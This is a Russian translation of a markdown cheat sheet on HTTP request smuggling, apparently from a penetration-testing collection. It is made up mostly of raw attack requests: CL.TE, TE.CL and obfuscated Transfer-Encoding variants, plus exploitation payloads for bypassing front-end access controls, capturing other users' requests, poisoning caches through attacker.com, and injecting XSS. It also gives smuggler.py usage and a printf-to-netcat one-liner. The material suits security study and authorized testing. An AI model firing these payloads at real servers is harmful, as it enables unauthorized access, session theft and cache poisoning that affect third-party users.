<a id="-http-request-smuggling-cheatsheet"></a>
# 📦 Справочник по контрабанде HTTP-запросов

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../README.md)

> **Уточнение к оригиналу.** В [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html#section-6.3) сочетание Transfer-Encoding и Content-Length рассматривается как возможная ошибка границ сообщения; отправитель не должен использовать их вместе. Некорректные пробелы перед двоеточием и переносы заголовков могут отклоняться. TE.TE — различие в распознавании Transfer-Encoding, а не отдельное правило определения длины.
>
> Примеры иллюстративны: длины, размеры блоков и незавершённые запросы зависят от точных байтов и CRLF. Markdown не является готовой записью сетевого обмена; все исходные строки запросов и пустые строки сохранены. Строки с # — пояснения, а не часть HTTP. По [методике PortSwigger](https://portswigger.net/web-security/request-smuggling/finding), задержку и различия ответов нужно связывать с обработкой следующего запроса: один тайм-аут или 404 сам по себе не доказывает уязвимость. Неполный или неверный блок может вызвать ошибку разбора, а не ожидание. [HTTP/2](https://portswigger.net/web-security/request-smuggling/advanced) не использует кодирование chunked из HTTP/1.1; важны условия преобразования между версиями.

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

<a id="-what-is-request-smuggling"></a>
## 🎯 Что такое контрабанда запросов

**Контрабанда HTTP-запросов (HTTP Request Smuggling)** использует различия в разборе HTTP-запросов внешним прокси (front-end) и внутренним сервером (back-end), позволяя внедрять дополнительные запросы.

<a id="impact"></a>
### Последствия
- 🔴 **Обход механизмов защиты** — обход WAF и списков контроля доступа (ACL)
- 🔴 **Отравление веб-кеша** — кеширование вредоносных ответов
- 🔴 **Кража учётных данных** — перехват запросов других пользователей
- 🔴 **XSS** — отражённая XSS через внедрённый запрос

---

<a id="-how-it-works"></a>
## 🔍 Как это работает

<a id="headers-involved"></a>
### Задействованные заголовки
```http
Content-Length: 13
Transfer-Encoding: chunked
```

<a id="vulnerability-types"></a>
### Типы уязвимости
| Тип | Внешний сервер использует | Внутренний сервер использует |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Обфускация для обеих сторон | Один заголовок игнорируется |

---

<a id="-attack-payloads"></a>
## 💉 Полезные нагрузки для атаки

<a id="clte-content-length--transfer-encoding"></a>
### CL.TE (Content-Length → Transfer-Encoding)

**Внешний сервер использует Content-Length, внутренний — Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Эксплуатация:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

<a id="tecl-transfer-encoding--content-length"></a>
### TE.CL (Transfer-Encoding → Content-Length)

**Внешний сервер использует Transfer-Encoding, внутренний — Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

<a id="tete-obfuscated-transfer-encoding"></a>
### TE.TE (обфускация Transfer-Encoding)

```http
# Изменить представление заголовка TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

<a id="-exploitation-examples"></a>
## 🔥 Примеры эксплуатации

<a id="bypass-front-end-security"></a>
### Обход защиты внешнего сервера
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

<a id="capture-other-users-requests"></a>
### Перехват запросов других пользователей
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*Запрос следующего пользователя добавляется к `data=`*

<a id="cache-poisoning-via-smuggling"></a>
### Отравление кеша через контрабанду запросов
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

<a id="xss-via-smuggling"></a>
### XSS через контрабанду запросов
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

<a id="-detection"></a>
## 🔍 Обнаружение

<a id="timing-based-detection"></a>
### Обнаружение по задержке ответа
```http
# Проверка CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Если внутренний сервер использует TE, он ждёт завершающий блок "0" (упрощение оригинала; см. уточнение)
# Тайм-аут = возможная уязвимость
```

<a id="differential-response"></a>
### Различия в ответах
```http
# Отправить внедрённый запрос, вызывающий 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Следующий ответ 404 = уязвимость (утверждение оригинала; см. уточнение)
```

---

<a id="-tools"></a>
## 🛠️ Инструменты

<a id="burp-suite-extension"></a>
### Расширение Burp Suite
```
1. Установить расширение "HTTP Request Smuggler"
2. Нажать правой кнопкой на запрос → Extensions → Launch Smuggle Probe (запустить проверку)
3. Проверить результаты на признаки контрабанды запросов
```

<a id="smugglerpy"></a>
### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

<a id="manual-with-curl"></a>
### Ручная проверка с curl
```bash
# Примечание: curl нормализует заголовки; может потребоваться прямая отправка данных по TCP
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="detection-checklist"></a>
### Список проверок для обнаружения
```markdown
- [ ] Проверить наличие прокси или балансировщика нагрузки (нескольких серверов)
- [ ] Проверить задержки для CL.TE
- [ ] Проверить задержки для TE.CL
- [ ] Проверить обфускацию заголовка TE
- [ ] Подтвердить результат по различиям в ответах
```

<a id="common-indicators"></a>
### Типичные признаки
```
- Балансировщики нагрузки (AWS ALB, HAProxy)
- Обратные прокси (nginx, Apache)
- Сети доставки содержимого, CDN (Cloudflare, Akamai)
- Преобразование HTTP/2 в HTTP/1.1 (downgrade)
```

---

<a id="-important-notes"></a>
## ⚠️ Важные замечания

```
1. Проверки могут нарушить работу других пользователей
2. По возможности использовать изолированные тестовые среды
3. Добавлять уникальные идентификаторы для распознавания своих запросов
4. Ответственно сообщать об уязвимости, приложив подтверждение (PoC)
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Контрабанда HTTP-запросов: PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [Атаки рассинхронизации HTTP (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Инструмент Smuggler](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 Исследуйте контрабанду запросов!</b><br>
  <i>Только для проверок с разрешения владельца!</i>
</p>
